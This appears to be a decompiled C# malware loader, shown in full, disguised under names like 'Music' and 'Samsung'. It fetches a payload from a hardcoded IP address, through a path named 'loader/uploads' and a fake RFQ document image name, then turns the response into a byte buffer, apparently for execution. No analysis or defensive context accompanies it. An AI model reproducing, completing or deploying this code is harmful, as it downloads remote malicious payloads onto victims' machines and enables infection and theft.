using System;
using System.IO;
using System.Net;
using System.Text;

namespace WindowsFormsApp32;

internal class Music
{
	internal static byte[] GetBuffer()
	{
		object obj = Samsung.Buffer(Dsuszwddxrsaplpacdgcf("http://45.155.165.63/iyi/loader/uploads/Doc_1507_161_RFQ_Smafjujv.jpg"));
		if (obj == null)
		{
			obj = null;
		}
		else if (obj != null)
		{
			return (byte[])obj;
		}
		throw new Exception();
	}

	private static string Dsuszwddxrsaplpacdgcf(string s)
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		using StreamReader streamReader = new StreamReader(WebRequest.Create(s).GetResponse().GetResponseStream(), Encoding.UTF8);
		return streamReader.ReadToEnd();
	}
}
